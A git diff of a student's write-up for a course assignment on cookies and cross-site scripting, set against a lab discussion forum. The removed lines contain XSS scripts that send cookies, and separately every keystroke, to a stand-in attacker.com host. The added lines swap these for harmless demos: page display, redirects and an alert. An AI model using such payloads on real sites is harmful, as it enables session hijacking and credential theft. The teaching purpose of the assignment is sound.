@@ -83,24 +83,24 @@ This assignment explores cookies and Cross-Site Scripting (XSS) in the [Fake Dis
 
 ### b. Describe an XSS attack that is more virulent than Moriarty's "turn something red" and "pop up a message" attacks. Think about what kinds of things the Javascript might have access to via Alice's browser when Alice views the attacker's post.
 
-/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY
-The attacker might gather information about theme preference of each user to observe user settings across different users, then combine these data to gain insights about user behavior. In this case, the script could retrieve Alice's theme color cookie and send it to an external server controlled by the attacker, allowing the attacker to collect data about Alice's preferences on this website. This will get Alice's cookie info about the theme color! red or blue or default.
+The attacker might gather information about theme preference of each user to observe user settings across different users, then combine these data to gain insights about user behavior. In this case, the script accesses Alice's theme color cookie and displays the retrieved data on the webpage. By observing the preferences displayed, the attacker gains insights into Alice's settings on this website, such as whether she prefers a red, blue, or default theme.
 
 ```html
 <script>
-  fetch("https://attacker.com/steal-theme", {
-    method: "POST",
-    body: `theme=${document.cookie}`,
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded",
-    },
-  });
+  const theme = document.cookie;
+  console.log(`Theme preference: ${theme}`);
+  document.body.innerHTML += `<p>Theme preference: ${theme}</p>`;
+</script>
+```
+
+```html
+<script>
+  const fake = `User Agent: ${navigator.userAgent}`;
+  document.body.innerHTML += `<p>${fake}</p>`;
 </script>
 ```
 
 Moreover, the script could retrieve Alice's authentication cookies (when there are more sensitive cookies) and send them to an external server controlled by the attacker. With these cookies, the attacker could impersonate Alice, gain access to her account, and post malicious content under her name.
-
-/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY
 
 ```html
 <script>
@@ -118,21 +118,66 @@ Moreover, the script could retrieve Alice's authentication cookies (when there a
 
 ### c. Do it again: describe a second attack that is more virulent than Moriarty's, but that's substantially different from your first idea.
 
-This JavaScript could capture sensitive information like usernames, passwords, and other personal information as users type. The data could then be sent to the attacker’s server, compromising the security of any user interacting with the page.
-
-/////I HAVEN'T TESTED IT YET BECAUSE THE FDF WAS DOWN UNINTENTIONALLY
+Then, these scripts redirect the user to a different webpage by setting window.location.href, which changes the current page to a new URL. This redirection can be risky if an attacker uses it to redirect users to a phishing website, where they might be tricked into entering sensitive information like usernames and passwords. If the user unknowingly logs into a fake site, the attacker can capture their credentials and use them for unauthorized access.
 
 ```html
 <script>
-  document.addEventListener("keypress", function (event) {
-    fetch("https://attacker.com/keystrokes", {
-      method: "POST",
-      body: JSON.stringify({ key: event.key }),
-      headers: {
-        "Content-Type": "application/json",
-      },
-    });
-  });
+  window.location.href = "https://en.wikipedia.org/wiki/HTTP_cookie";
+</script>
+```
+
+```html
+<script>
+  window.location.href =
+    "https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=AffyBPzUiQ6vJVsY8W1KdPuNchpBaBzxjSin_MkUyXZu26cy4UU-xuRz_Or_1Bh_1-2Ma4TJQnsyQP7yv_HARa8VBzGs47FpKeRUr7FB5j3Yiw&smuh=30079&lh=Ac-JeKIpFmuUKTmYa_E";
+</script>
+```
+
+This is the test for alert!:
+
+```html
+<script>
+  alert("This is a test alert for XSS!");
+  document.body.style.backgroundColor = "lightblue";
+</script>
+```
+
+This HTML code creates a comment box under a post, allowing users to submit comments and share their thoughts.
+
+```html
+hello, any comments?
+<div id="comments-section">
+  <h3>Comments</h3>
+
+  <textarea
+    id="comment-input"
+    rows="4"
+    placeholder="Write your comment here..."
+  ></textarea>
+  <br />
+  <button onclick="addComment()">Submit Comment</button>
+
+  <div id="comments-container"></div>
+</div>
+
+<script>
+  function addComment() {
+    const commentText = document.getElementById("comment-input").value;
+
+    if (commentText.trim() !== "") {
+      const commentDiv = document.createElement("div");
+      commentDiv.classList.add("comment");
+
+      const commentNode = document.createTextNode(commentText);
+      commentDiv.appendChild(commentNode);
+
+      document.getElementById("comments-container").appendChild(commentDiv);
+
+      document.getElementById("comment-input").value = "";
+    } else {
+      alert("Please write a comment before submitting.");
+    }
+  }
 </script>
 ```
 
